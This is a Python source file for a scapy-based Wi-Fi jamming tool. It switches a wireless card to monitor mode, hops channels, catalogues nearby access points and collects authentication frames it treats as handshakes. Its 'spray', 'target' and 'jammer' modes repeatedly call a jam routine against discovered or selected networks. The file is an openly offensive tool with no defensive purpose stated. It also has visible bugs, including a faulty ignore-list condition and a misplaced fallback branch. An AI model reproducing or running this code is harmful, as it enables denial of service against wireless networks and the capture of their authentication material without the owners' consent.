#!/bin/python3
from scapy.sendrecv import sniff
from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap
from scapy.utils import PcapWriter

from time import sleep, monotonic

#import threading
import multiprocessing

from subprocess import Popen

import logging
logger = logging.getLogger(__name__)

from AP import AccessPoint

class Jammer():
	def __init__(self, ignoreBeacons, attackMode, sendInt, recvInt, output, searchingChannels, targets, sleepOnChannel):
		self.ignoreBeacons = ignoreBeacons
		self.attackMode = attackMode
		self.sendInt = sendInt
		self.recvInt = recvInt
		self.output = output
		self.searchingChannels = searchingChannels
		self.targets = targets
		self.sleepOnChannel = sleepOnChannel

		self.handshakesFound = {}
		self.discoveredAPs = []
		self.channelIndex = 0
		self.running = True

	def setRecvIntMonitor(self):
		Popen(['ip', 'link', 'set', self.recvInt, 'down'], shell=False)
		Popen(['iw', 'dev', self.recvInt, 'set', 'type', 'monitor'], shell=False)
		Popen(['ip', 'link', 'set', self.recvInt, 'up'], shell=False)
		logging.debug('Set ' + self.recvInt + ' to Monitor Mode')

	def setRecvIntStation(self):
		Popen(['ip', 'link', 'set', self.recvInt, 'down'], shell=False)
		Popen(['iw', 'dev', self.recvInt, 'set', 'type', 'station'], shell=False)
		Popen(['ip', 'link', 'set', self.recvInt, 'up'], shell=False)
		logging.debug('Set ' + self.recvInt + ' to Station Mode')

	def freqToChannel(self, freq):
		base = 2407			# 2.4Ghz
		if freq // 1000 == 5: 
			base = 5000		# 5Ghz
		# 2.4 and 5Ghz channels increment by 5
		return (freq - base)//5

	def changeChannel(self, newChannel, interface):
		Popen(['iwconfig', interface, 'channel', str(newChannel)], shell=False)

		logging.debug('Set channel to ' + str(newChannel) + ' on ' + interface)

	def channelHop(self):
		while self.running == True:
			# if the channel index is that of the last in the searchingChannels list, reset it to 0
			if self.channelIndex == len(self.searchingChannels) - 1:
				self.channelIndex = 0
			# otherwise, increment by 1
			else:
				self.channelIndex += 1
			# Then for self.sleepOnChannel seconds, change the change to this one every 0.25 seconds
			currentTime = monotonic()
			while monotonic() < currentTime + self.sleepOnChannel and self.running == True:
				self.changeChannel(self.searchingChannels[self.channelIndex], self.recvInt)
				sleep(0.25)

	def readPacket(self, packet):
		# If the packet is a frame...
		if packet.haslayer(Dot11):
			# If the packet is a management frame
			if packet.type == 0:
				essid = bytes.decode(packet[Dot11Elt].info)
				bssid = packet.addr2
				# If the packet is a beacon frame
				if packet.subtype == 8:
					# If it isn't to be ignored
					if essid not in self.ignoreBeacons or bssid not in self.ignoreBeacons:
						# add bssid to discoveredAPs
						# create new AccessPoint class and append to targets
						# ensure we don't sniff further beacons by adding to ignoreBeacons
						channel = self.freqToChannel(packet[RadioTap].Channel)
						self.discoveredAPs.append(AccessPoint(essid, bssid, channel))
						self.ignoreBeacons.append(bssid)
						logging.info('New AP found: ESSID = ' + essid + ', BSSID = ' +  bssid + ', CH = ' + str(channel))
				# Elif the packet is an authentication frame
				elif packet.subtype == 11:
					# if a handshake hasn't been captured
					if bssid not in list(self.handshakesFound.keys()):
						# Note it's been captured and write to output file if one exists
						self.handshakesFound[bssid] = packet
						logging.info('New Authentication Frame Found: ESSID = ' + essid)
			
				else:
					logging.debug('Found non-auth, non-beacon management frame')
			else:
				logging.debug('Found non-management frame transmission')

	def killSniffing(self, packet):
		if self.running == True:
			return False
		else:
			return True

	def sniffPackets(self):
		# For some reason, this doesn't work I think?
		sniff(count=0, prn=self.readPacket, stop_filter=self.killSniffing, iface=self.recvInt)

	def sprayAttack(self):
		# Spray attacks every located target until it gets a handshake
		while self.running == True:
			for AccessPoint in self.discoveredAPs:
				if AccessPoint.bssid not in list(self.handshakesFound.keys()):
					self.changeChannel(AccessPoint.channel, self.sendInt)
					AccessPoint.jam(self.sendInt)

	def unarmedAttack(self):
		while self.running == True:
		# Do not send any deauth
			sleep(1)

	def targetAttack(self):
		while self.running == True:
		# Only deauth targets
			for AccessPoint in self.discoveredAPs:
				if AccessPoint.bssid in self.targets or AccessPoint.essid in self.targets:
					self.changeChannel(AccessPoint.channel, self.sendInt)
					AccessPoint.jam(self.sendInt)

	def jammingAttack(self):
		while self.running == True:
			for AccessPoint in self.discoveredAPs:
				self.changeChannel(AccessPoint.channel, self.sendInt)
				AccessPoint.jam(self.sendInt)

	def launchAttack(self):
		# All three attacks condensed into one single switch
		if self.attackMode == 'spray':
			self.sprayAttack()
		elif self.attackMode == 'unarmed':
			self.unarmedAttack()
		elif self.attackMode == 'target':
			self.targetAttack()
		elif self.attackMode == 'jammer':
			self.jammingAttack()
			logging.debug('No attack mode set')
			return None

	def halt(self):
		self.running = False